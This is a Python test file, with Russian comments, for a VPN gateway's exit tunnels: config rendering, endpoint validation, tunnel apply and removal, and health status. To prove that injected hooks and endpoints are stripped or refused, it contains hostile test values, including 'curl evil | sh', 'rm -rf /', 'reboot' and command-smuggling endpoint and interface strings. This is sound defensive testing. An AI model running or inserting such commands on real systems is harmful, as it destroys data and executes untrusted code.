"""Туннели выходов шлюза (этап 24.2): конфиг для awg-quick, команды провайдера, статус и health на фейковом сервере.

Фейк не исполняет awg-quick; настоящее действие конфигов и команд проверено живым прогоном (см.
src/infrastructure/vpn/CLAUDE.md, раздел «Выходы»).
"""

import re
import time
from datetime import datetime, timezone

import pytest

from core.ssh_exception import CommandExecutionError, ForeignContainerError
from infrastructure.vpn.gateway import AmneziaGatewayProvider
from infrastructure.vpn.gateway_config import (
    EXIT_TABLE_BASE,
    GATEWAY_LAYOUT,
    MAX_EXIT_SLOT,
    RU_TABLE,
    ExitTunnel,
    ExitTunnelStatus,
    exit_health_label,
    exit_host_file,
    exit_interface,
    exit_needs_restart,
    exit_slot_from_interface,
    exit_table,
    format_endpoint,
    parse_transfer,
    render_exit_config,
)
from tests.fakes.fake_ssh import FakeServer, FakeSSHClient
from tests.gateway_support import EXIT_ENDPOINT, add_live_exit, apply_exits, client_config, exit_tunnel, fresh_handshake

NAME = GATEWAY_LAYOUT.container_name
HOST_DIR = GATEWAY_LAYOUT.host_config_dir
PRIV = "A" * 42 + "Q="
PUB = "B" * 42 + "Q="
PSK = "C" * 42 + "Q="
SERVER_PUB = "D" * 42 + "Q="

# Конфиг внутреннего клиента, каким его отдаёт create_client (в том числе то, что в конфиг выхода попадать не должно).
CLIENT_CONFIG = f"""[Interface]
PrivateKey = {PRIV}
Address = 10.8.1.2/32
DNS = 1.1.1.1, 1.0.0.1
Jc = 5
Jmin = 10
Jmax = 50
S1 = 60
S2 = 77
H1 = 1020325451
H2 = 3288052141
H3 = 1766607858
H4 = 2528465083
I1 = <b 0xf6ab><r 10>

[Peer]
PublicKey = {SERVER_PUB}
PresharedKey = {PSK}
Endpoint = 198.51.100.7:34567
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25
"""


async def installed() -> FakeServer:
    fake = FakeServer(layout=GATEWAY_LAYOUT)
    async with FakeSSHClient(fake) as ssh:
        await AmneziaGatewayProvider(ssh).install()
    return fake


async def call(fake: FakeServer, method: str, *args: object, **kwargs: object):  # noqa: ANN201
    async with FakeSSHClient(fake) as ssh:
        return await getattr(AmneziaGatewayProvider(ssh), method)(*args, **kwargs)


def with_address(config: str, address: str) -> str:
    return re.sub(r"(?m)^Address = \S+$", f"Address = {address}/32", config)


def tunnel(slot: int = 1, endpoint: str = EXIT_ENDPOINT, config: str = CLIENT_CONFIG) -> ExitTunnel:
    return ExitTunnel(slot=slot, client_config=config, endpoint=endpoint)


# --- слот, имена, таблицы ----------------------------------------------------------------------------------------


@pytest.mark.parametrize("slot", [0, -1, MAX_EXIT_SLOT + 1, True, False, "1", 1.0, None])
def test_names_are_built_only_from_an_integer_slot_in_range(slot: object) -> None:
    for build in (exit_interface, exit_table, lambda value: exit_host_file(GATEWAY_LAYOUT, value)):
        with pytest.raises(ValueError):
            build(slot)  # type: ignore[arg-type]


def test_names_of_the_first_and_the_last_slot() -> None:
    assert (exit_interface(1), exit_interface(MAX_EXIT_SLOT)) == ("gwx1", "gwx200")
    assert exit_host_file(GATEWAY_LAYOUT, 7) == f"{HOST_DIR}/exits/gwx7.conf"


def test_tables_never_touch_reserved_or_russian_ones_and_are_unique() -> None:
    """100 + слот попадал бы на 253/254/255 (default/main/local) и на RU_TABLE: база 1000 их обходит."""
    tables = [exit_table(slot) for slot in range(1, MAX_EXIT_SLOT + 1)]
    assert len(set(tables)) == MAX_EXIT_SLOT
    assert not set(tables) & {0, 253, 254, 255, RU_TABLE}
    assert min(tables) == EXIT_TABLE_BASE + 1 and max(tables) == EXIT_TABLE_BASE + MAX_EXIT_SLOT


@pytest.mark.parametrize(
    ("name", "slot"),
    [("gwx1", 1), ("gwx200", 200), ("gwx201", None), ("gwx0", None), ("gwx01", None), ("gw0", None), ("gwx", None),
     ("gwx1;reboot", None), ("xgwx1", None), ("gwx١", None), ("", None)],
)  # fmt: skip
def test_interface_names_map_back_to_slots_only_when_they_are_exits(name: str, slot: int | None) -> None:
    assert exit_slot_from_interface(name) == slot


# --- конфиг выхода -----------------------------------------------------------------------------------------------


def test_exit_config_is_exactly_this() -> None:
    assert render_exit_config(tunnel(slot=3)) == (
        "[Interface]\n"
        f"PrivateKey = {PRIV}\n"
        "Address = 10.8.1.2/32\n"
        "Jc = 5\nJmin = 10\nJmax = 50\nS1 = 60\nS2 = 77\n"
        "H1 = 1020325451\nH2 = 3288052141\nH3 = 1766607858\nH4 = 2528465083\n"
        "I1 = <b 0xf6ab><r 10>\n"
        "MTU = 1280\n"
        "Table = 1003\n"
        "PostUp = iptables -t nat -C POSTROUTING -o gwx3 -j MASQUERADE 2>/dev/null"
        " || iptables -t nat -A POSTROUTING -o gwx3 -j MASQUERADE\n"
        "PostDown = iptables -t nat -D POSTROUTING -o gwx3 -j MASQUERADE 2>/dev/null || true\n"
        "\n"
        "[Peer]\n"
        f"PublicKey = {SERVER_PUB}\n"
        f"PresharedKey = {PSK}\n"
        "Endpoint = 198.51.100.7:34567\n"
        "AllowedIPs = 0.0.0.0/0\n"
        "PersistentKeepalive = 25\n"
    )


def test_exit_config_takes_nothing_but_the_allowlist_from_the_client_interface() -> None:
    hostile = CLIENT_CONFIG.replace(
        "Jc = 5\n",
        "Jc = 5\nPostUp = curl evil | sh\nPreUp = reboot\nPostDown = rm -rf /\nTable = 254\nSaveConfig = true\n"
        "FwMark = 0x1\nListenPort = 1\nMTU = 9000\nHeaderProtectionKey = x\n",
    )
    config = render_exit_config(tunnel(slot=2, config=hostile))
    assert "evil" not in config and "reboot" not in config and "rm -rf" not in config
    for forbidden in ("Table = 254", "SaveConfig", "FwMark", "ListenPort", "MTU = 9000", "HeaderProtectionKey", "DNS"):
        assert forbidden not in config
    assert config.count("PostUp") == 1 and config.count("Table") == 1 and "Table = 1002" in config
    assert "MTU = 1280" in config


def test_exit_config_keeps_mtu_table_and_the_nat_hooks_idempotent() -> None:
    config = render_exit_config(tunnel(slot=5))
    assert "MTU = 1280\n" in config and f"Table = {EXIT_TABLE_BASE + 5}\n" in config
    assert "iptables -t nat -C POSTROUTING -o gwx5 -j MASQUERADE 2>/dev/null || iptables -t nat -A" in config
    assert "PostDown = iptables -t nat -D POSTROUTING -o gwx5 -j MASQUERADE 2>/dev/null || true" in config
    assert "AllowedIPs = 0.0.0.0/0\n" in config and "::" not in config


def test_exit_config_never_touches_the_main_table() -> None:
    for slot in (1, 100, 153, 154, 155, 200):
        match = re.search(r"^Table = (\d+)$", render_exit_config(tunnel(slot=slot)), re.M)
        assert match and int(match.group(1)) not in (0, 253, 254, 255, RU_TABLE)


@pytest.mark.parametrize(
    "endpoint",
    ["host\nPostUp = evil:1", "1.2.3.4:0", "1.2.3.4:65536", "a b:1", "host#x:1", "host;ls:1", "[::1:5", "[zz]:5",
     "host", ":5", "host:", "host:١٢", "host:+5", "-bad.example:5", "exa mple.org:5", "1.2.3.4:5\n", "a:b:5"],
)  # fmt: skip
def test_hostile_or_broken_endpoints_are_refused(endpoint: str) -> None:
    with pytest.raises(ValueError, match="Invalid exit endpoint"):
        render_exit_config(tunnel(endpoint=endpoint))


@pytest.mark.parametrize(
    ("host", "port", "expected"),
    [("203.0.113.10", 34567, "203.0.113.10:34567"), ("vpn.example.org", 1, "vpn.example.org:1"),
     ("2001:db8::1", 443, "[2001:db8::1]:443")],
)  # fmt: skip
def test_good_endpoints_pass(host: str, port: int, expected: str) -> None:
    endpoint = format_endpoint(host, port)
    assert endpoint == expected
    assert f"Endpoint = {expected}\n" in render_exit_config(tunnel(endpoint=endpoint))


def test_exit_config_refuses_a_broken_client_config_without_quoting_it() -> None:
    broken = [
        CLIENT_CONFIG.replace(f"PrivateKey = {PRIV}\n", ""),
        CLIENT_CONFIG.replace(PRIV, "short"),
        CLIENT_CONFIG.replace("Address = 10.8.1.2/32", "Address = fd00::2/128"),
        CLIENT_CONFIG.replace(f"PresharedKey = {PSK}\n", ""),
        CLIENT_CONFIG.replace("Jc = 5", "Jc = 5\nS3 = 1; reboot"),
        "",
    ]
    for config in broken:
        with pytest.raises(ValueError) as caught:
            render_exit_config(tunnel(config=config))
        assert PRIV not in str(caught.value) and PSK not in str(caught.value) and "reboot" not in str(caught.value)


def test_exit_tunnel_does_not_show_its_config_in_repr() -> None:
    text = repr(tunnel()) + str(tunnel())
    assert PRIV not in text and PSK not in text and "198.51.100.7:34567" in text


def test_restart_is_needed_only_for_changes_syncconf_cannot_apply() -> None:
    base = render_exit_config(tunnel())
    assert exit_needs_restart(base, base) is False
    assert exit_needs_restart(None, base) is True
    assert exit_needs_restart("garbage", base) is True
    other_endpoint = render_exit_config(tunnel(endpoint="203.0.113.9:1000"))
    assert exit_needs_restart(base, other_endpoint) is False
    other_keys = render_exit_config(tunnel(config=CLIENT_CONFIG.replace(PRIV, "E" * 42 + "Q=").replace(PSK, PUB)))
    assert exit_needs_restart(base, other_keys) is False
    other_obfuscation = render_exit_config(tunnel(config=CLIENT_CONFIG.replace("Jc = 5", "Jc = 7")))
    assert exit_needs_restart(base, other_obfuscation) is False
    assert (
        exit_needs_restart(base, render_exit_config(tunnel(config=CLIENT_CONFIG.replace("10.8.1.2", "10.8.1.3"))))
        is True
    )
    assert exit_needs_restart(base, render_exit_config(tunnel(slot=2))) is True  # другой Table и хуки


# --- разбор вывода и метки health --------------------------------------------------------------------------------


def test_parse_transfer_sums_peers_and_skips_garbage() -> None:
    assert parse_transfer("") == (0, 0)
    assert parse_transfer(f"{PUB}\t100\t200\n{SERVER_PUB}\t1\t2\n") == (101, 202)
    assert parse_transfer("garbage\nkey\tx\ty\n\t1\t2\n") == (0, 0)


def test_health_labels() -> None:
    now = datetime.now(timezone.utc)
    up = ExitTunnelStatus(1, True, now)
    assert exit_health_label(up, now) == "ok"
    assert exit_health_label(ExitTunnelStatus(1, True, None), now) == "no_handshake"
    assert (
        exit_health_label(ExitTunnelStatus(1, True, datetime.fromtimestamp(time.time() - 600, timezone.utc)), now)
        == "stale"
    )
    assert exit_health_label(ExitTunnelStatus(1, False, now), now) == "down"
    assert exit_health_label(None, now) == "down"


# --- apply_exits / remove_exit на фейковом шлюзе -----------------------------------------------------------------

CONSTANT_COMMANDS = re.compile(
    rf"docker ps -a --filter '[^']*' --format '\{{\{{\.State\}}\}}'"
    rf"|docker inspect --type container -f '[^']*' {NAME}"
    rf"|docker exec {NAME} awg show interfaces"
    rf"|docker exec {NAME} awg-quick (?:up|down) /etc/vpn-admin/gw/exits/gwx[1-9][0-9]{{0,2}}\.conf"
    rf"|docker exec {NAME} ip link delete dev gwx[1-9][0-9]{{0,2}}"
    rf"|docker exec {NAME} iptables -t nat -D POSTROUTING -o gwx[1-9][0-9]{{0,2}} -j MASQUERADE \|\| true"
    rf"|docker exec {NAME} awg show gwx[1-9][0-9]{{0,2}} (?:latest-handshakes|transfer)"
    rf"|docker exec {NAME} sh -c 'umask 077; awg-quick strip /etc/vpn-admin/gw/exits/gwx([1-9][0-9]{{0,2}})\.conf"
    r" > /tmp/gwx\1\.stripped && awg syncconf gwx\1 /tmp/gwx\1\.stripped;"
    r" rc=\$\?; rm -f /tmp/gwx\1\.stripped; exit \$rc'"
    rf"|rm -f {HOST_DIR}/exits/gwx[1-9][0-9]{{0,2}}\.conf"
    rf"|test -f {HOST_DIR}/exits/gwx[1-9][0-9]{{0,2}}\.conf"
)


def issued(fake: FakeServer, start: int) -> list[str]:
    return [" ".join(command.split()) for command in fake.commands[start:]]


def secrets_of(config: str) -> list[str]:
    return re.findall(r"(?:PrivateKey|PresharedKey) = (\S+)", config)


async def test_apply_writes_a_private_file_and_brings_the_interface_up() -> None:
    fake = await installed()
    config = await client_config()
    start = len(fake.commands)
    await apply_exits(fake, [await exit_tunnel(slot=1, config=config)])

    path = f"{HOST_DIR}/exits/gwx1.conf"
    assert fake.files[path] == render_exit_config(ExitTunnel(1, config, EXIT_ENDPOINT))
    assert fake.file_modes[path] == 0o600 and fake.dirs[f"{HOST_DIR}/exits"] == 0o700
    assert fake.exit_interfaces == ["gwx1"] and fake.exit_configs["gwx1"] == fake.files[path]
    commands = issued(fake, start)
    assert all(CONSTANT_COMMANDS.fullmatch(command) for command in commands), commands
    assert commands[-1] == f"docker exec {NAME} awg-quick up /etc/vpn-admin/gw/exits/gwx1.conf"
    assert not any(secret in command for command in commands for secret in secrets_of(config))


async def test_apply_is_idempotent_and_changes_nothing_the_second_time() -> None:
    fake = await installed()
    tunnels = [await exit_tunnel(slot=1), await exit_tunnel(slot=2)]
    await apply_exits(fake, tunnels)
    writes, start = list(fake.writes), len(fake.commands)
    await apply_exits(fake, tunnels)
    assert fake.writes == writes and fake.exit_interfaces == ["gwx1", "gwx2"]
    assert all("awg-quick" not in command and "syncconf" not in command for command in issued(fake, start))


async def test_a_changed_endpoint_or_keys_are_applied_on_the_live_interface_without_restart() -> None:
    fake = await installed()
    config = await client_config()
    await apply_exits(fake, [await exit_tunnel(config=config)])
    start = len(fake.commands)
    await apply_exits(fake, [await exit_tunnel(endpoint="203.0.113.9:1000", config=config)])

    commands = issued(fake, start)
    assert any("awg syncconf gwx1" in command for command in commands)
    assert not any("awg-quick up" in command or "awg-quick down" in command for command in commands)
    assert "Endpoint = 203.0.113.9:1000" in fake.files[f"{HOST_DIR}/exits/gwx1.conf"]
    assert "Endpoint = 203.0.113.9:1000" in fake.exit_configs["gwx1"]
    assert all(CONSTANT_COMMANDS.fullmatch(command) for command in commands)


async def test_the_sync_command_never_feeds_syncconf_from_a_process_substitution() -> None:
    fake = await installed()
    config = await client_config()
    await apply_exits(fake, [await exit_tunnel(config=config)])
    await apply_exits(fake, [await exit_tunnel(endpoint="203.0.113.9:1000", config=config)])
    sync = next(command for command in fake.commands if "syncconf" in command)
    assert "<(" not in sync and "awg-quick strip" in sync and sync.index("strip") < sync.index("&&")
    assert "rm -f /tmp/gwx1.stripped" in sync


async def test_a_changed_address_recreates_the_interface_down_before_the_new_file() -> None:
    fake = await installed()
    first, second = await client_config(), await client_config()
    await apply_exits(fake, [await exit_tunnel(config=first)])
    old_text = fake.files[f"{HOST_DIR}/exits/gwx1.conf"]
    writes_before = len(fake.writes)
    commands_before = len(fake.commands)
    await apply_exits(fake, [await exit_tunnel(config=with_address(second, "10.8.1.9"))])

    commands = issued(fake, commands_before)
    down = next(i for i, command in enumerate(commands) if "awg-quick down" in command)
    up = next(i for i, command in enumerate(commands) if "awg-quick up" in command)
    assert down < up
    assert len(fake.writes) == writes_before + 1  # файл записан после down: PostDown отработал по старому
    assert "Address = 10.8.1.9/32" in fake.files[f"{HOST_DIR}/exits/gwx1.conf"] != old_text
    assert fake.exit_interfaces == ["gwx1"]


async def test_a_failed_up_removes_the_new_file_and_leaves_no_interface_and_no_keys_in_the_error() -> None:
    fake = await installed()
    fake.exit_up_fails = {1}
    config = await client_config()
    with pytest.raises(CommandExecutionError) as caught:
        await apply_exits(fake, [await exit_tunnel(config=config)])
    assert f"{HOST_DIR}/exits/gwx1.conf" not in fake.files and fake.exit_interfaces == []
    assert not any(secret in str(caught.value) for secret in secrets_of(config))
    assert "gwx1" in str(caught.value)


async def test_a_failed_syncconf_restores_the_previous_file_and_keeps_the_interface() -> None:
    fake = await installed()
    config = await client_config()
    await apply_exits(fake, [await exit_tunnel(config=config)])
    old_text = fake.files[f"{HOST_DIR}/exits/gwx1.conf"]
    fake.exit_sync_fails = {1}
    with pytest.raises(CommandExecutionError):
        await apply_exits(fake, [await exit_tunnel(endpoint="203.0.113.9:1000", config=config)])
    assert fake.files[f"{HOST_DIR}/exits/gwx1.conf"] == old_text
    assert fake.exit_interfaces == ["gwx1"] and fake.exit_configs["gwx1"] == old_text


async def test_a_failed_recreate_puts_the_old_file_back_and_tries_to_bring_the_old_tunnel_up() -> None:
    fake = await installed()
    config = await client_config()
    await apply_exits(fake, [await exit_tunnel(config=config)])
    old_text = fake.files[f"{HOST_DIR}/exits/gwx1.conf"]
    fake.exit_up_fails = {1}
    with pytest.raises(CommandExecutionError):
        await apply_exits(fake, [await exit_tunnel(config=with_address(config, "10.8.1.9"))])
    assert fake.files[f"{HOST_DIR}/exits/gwx1.conf"] == old_text  # файл не остался с новым Address


async def test_apply_needs_a_running_own_container_and_writes_nothing_otherwise() -> None:
    fake = await installed()
    fake.containers[NAME] = "exited"
    with pytest.raises(CommandExecutionError, match="not running"):
        await apply_exits(fake, [await exit_tunnel()])
    assert f"{HOST_DIR}/exits/gwx1.conf" not in fake.files

    foreign = FakeServer(layout=GATEWAY_LAYOUT)
    foreign.add_foreign_container()
    with pytest.raises(ForeignContainerError):
        await apply_exits(foreign, [await exit_tunnel()])
    assert foreign.writes == []


async def test_apply_of_nothing_touches_nothing() -> None:
    fake = await installed()
    start = len(fake.commands)
    await apply_exits(fake, [])
    assert fake.commands[start:] == [] and fake.exit_interfaces == []


async def test_remove_takes_the_interface_down_and_deletes_the_file_and_is_idempotent() -> None:
    fake = await installed()
    await apply_exits(fake, [await exit_tunnel(slot=1), await exit_tunnel(slot=2)])
    start = len(fake.commands)
    await call(fake, "remove_exit", 1)
    assert fake.exit_interfaces == ["gwx2"] and f"{HOST_DIR}/exits/gwx1.conf" not in fake.files
    assert f"{HOST_DIR}/exits/gwx2.conf" in fake.files
    assert all(CONSTANT_COMMANDS.fullmatch(command) for command in issued(fake, start))
    await call(fake, "remove_exit", 1)  # повтор: ни интерфейса, ни файла - не ошибка
    assert fake.exit_interfaces == ["gwx2"]


async def test_a_failed_down_keeps_both_the_file_and_the_interface() -> None:
    fake = await installed()
    await apply_exits(fake, [await exit_tunnel()])
    fake.exit_down_fails = {1}
    with pytest.raises(CommandExecutionError):
        await call(fake, "remove_exit", 1)
    assert fake.exit_interfaces == ["gwx1"] and f"{HOST_DIR}/exits/gwx1.conf" in fake.files


async def test_an_interface_without_a_file_is_deleted_by_link() -> None:
    fake = await installed()
    await apply_exits(fake, [await exit_tunnel()])
    fake.files.pop(f"{HOST_DIR}/exits/gwx1.conf")
    await call(fake, "remove_exit", 1)
    assert fake.exit_interfaces == []
    link = f"docker exec {NAME} ip link delete dev gwx1"
    cleanup = f"docker exec {NAME} iptables -t nat -D POSTROUTING -o gwx1 -j MASQUERADE || true"
    # PostDown без файла не выполнится: правило NAT снимается отдельной константной командой перед удалением ссылки
    assert fake.exit_nat_cleanups == ["gwx1"] and fake.commands.index(cleanup) < fake.commands.index(link)


async def test_remove_of_a_stopped_gateway_only_deletes_the_file() -> None:
    fake = await installed()
    await apply_exits(fake, [await exit_tunnel()])
    fake.containers[NAME] = "exited"
    start = len(fake.commands)
    await call(fake, "remove_exit", 1)
    assert f"{HOST_DIR}/exits/gwx1.conf" not in fake.files
    assert not any("docker exec" in command for command in issued(fake, start))


@pytest.mark.parametrize("slot", [0, 201, True, "1"])
async def test_remove_refuses_a_bad_slot_before_any_command(slot: object) -> None:
    fake = await installed()
    start = len(fake.commands)
    with pytest.raises(ValueError):
        await call(fake, "remove_exit", slot)
    assert fake.commands[start:] == []


# --- статус и health ---------------------------------------------------------------------------------------------


async def test_status_reports_handshake_and_traffic_of_every_exit() -> None:
    fake = await installed()
    await add_live_exit(fake, 1)
    await add_live_exit(fake, 2, handshake=0)
    fake.exit_transfer = {1: (1000, 2000)}
    statuses = {status.slot: status for status in await call(fake, "exit_status")}
    assert set(statuses) == {1, 2}
    assert statuses[1].interface_up and statuses[1].latest_handshake is not None
    assert (statuses[1].rx_bytes, statuses[1].tx_bytes) == (1000, 2000)
    assert statuses[2].interface_up and statuses[2].latest_handshake is None


async def test_status_marks_expected_but_missing_exits_down_and_ignores_foreign_interfaces() -> None:
    fake = await installed()
    await add_live_exit(fake, 1)
    fake.exit_interfaces.append("wg-other")
    statuses = {status.slot: status for status in await call(fake, "exit_status", expected=[1, 5])}
    assert set(statuses) == {1, 5}
    assert statuses[5].interface_up is False and statuses[5].latest_handshake is None


async def test_status_commands_are_read_only_and_leak_nothing() -> None:
    fake = await installed()
    tunnel_ = await add_live_exit(fake, 1)
    start = len(fake.commands)
    statuses = await call(fake, "exit_status")
    assert all(CONSTANT_COMMANDS.fullmatch(command) for command in issued(fake, start))
    assert not any(secret in repr(statuses) for secret in secrets_of(tunnel_.client_config))


async def test_health_exits_check_needs_one_healthy_tunnel_and_names_every_tunnel() -> None:
    fake = await installed()
    await add_live_exit(fake, 1)
    await add_live_exit(fake, 2, handshake=0)
    await add_live_exit(fake, 3, handshake=int(time.time()) - 3600)
    health = await call(fake, "health_check")
    exits = next(check for check in health.checks if check.name == "exits")
    assert exits.ok
    assert exits.detail == "3 exit tunnel(s), 1 healthy: gwx1 ok, gwx2 no_handshake, gwx3 stale"


async def test_health_exits_check_fails_without_a_healthy_tunnel() -> None:
    fake = await installed()
    await add_live_exit(fake, 1, handshake=0)
    health = await call(fake, "health_check")
    exits = next(check for check in health.checks if check.name == "exits")
    assert not exits.ok and exits.detail == "1 exit tunnel(s), 0 healthy: gwx1 no_handshake"


# --- перезапуск контейнера ---------------------------------------------------------------------------------------


async def test_a_container_restart_brings_the_exits_back_from_their_files() -> None:
    fake = await installed()
    await apply_exits(fake, [await exit_tunnel(slot=1), await exit_tunnel(slot=2)])
    fake.containers[NAME] = "exited"
    async with FakeSSHClient(fake) as ssh:
        assert (await ssh.execute(f"docker start {NAME}")).exit_status == 0
    assert sorted(fake.exit_interfaces) == ["gwx1", "gwx2"]


async def test_a_broken_exit_config_does_not_keep_the_container_down() -> None:
    fake = await installed()
    await apply_exits(fake, [await exit_tunnel(slot=1), await exit_tunnel(slot=2)])
    fake.exit_up_fails = {1}
    fake.containers[NAME] = "exited"
    async with FakeSSHClient(fake) as ssh:
        await ssh.execute(f"docker start {NAME}")
    assert fake.containers[NAME] == "running" and fake.exit_interfaces == ["gwx2"]


def test_fresh_handshake_helper_is_inside_the_active_window() -> None:
    assert time.time() - fresh_handshake() < 60


async def test_the_temporary_stripped_file_is_created_private() -> None:
    """Во временном файле приватный ключ: umask 077 в начале скрипта, иначе файл был бы 0644 (umask контейнера)."""
    fake = await installed()
    config = await client_config()
    await apply_exits(fake, [await exit_tunnel(config=config)])
    await apply_exits(fake, [await exit_tunnel(endpoint="203.0.113.9:1000", config=config)])
    sync = next(command for command in fake.commands if "syncconf" in command)
    assert sync.startswith(f"docker exec {NAME} sh -c 'umask 077; awg-quick strip ")


async def test_uninstalling_the_gateway_removes_the_exit_files_with_the_whole_folder() -> None:
    """Папка шлюза удаляется целиком (`rm -rf`), вместе с exits/gwx*.conf; интерфейсы уходят с контейнером."""
    fake = await installed()
    await apply_exits(fake, [await exit_tunnel(slot=1), await exit_tunnel(slot=2)])
    assert any(path.startswith(f"{HOST_DIR}/exits/") for path in fake.files)
    await call(fake, "uninstall")
    assert not any(path.startswith(HOST_DIR) for path in fake.files)
    assert fake.exit_interfaces == [] and NAME not in fake.containers
